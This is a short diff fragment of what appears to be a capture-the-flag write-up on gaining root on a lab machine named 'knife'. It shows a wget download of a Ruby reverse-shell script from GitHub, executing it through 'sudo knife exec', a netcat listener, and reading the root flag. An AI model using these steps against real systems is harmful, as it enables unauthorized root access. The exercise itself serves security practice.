@@ -45,6 +45,9 @@ james@knife:~$ cd /dev/shm
 wget https://raw.githubusercontent.com/secjohn/ruby-shells/master/revshell.rb
 
 sudo /usr/bin/knife  exec revershell.rb
+
+sudo nc -lvnp $PORT
+
 whoami
 root
 cat /root/root.txt
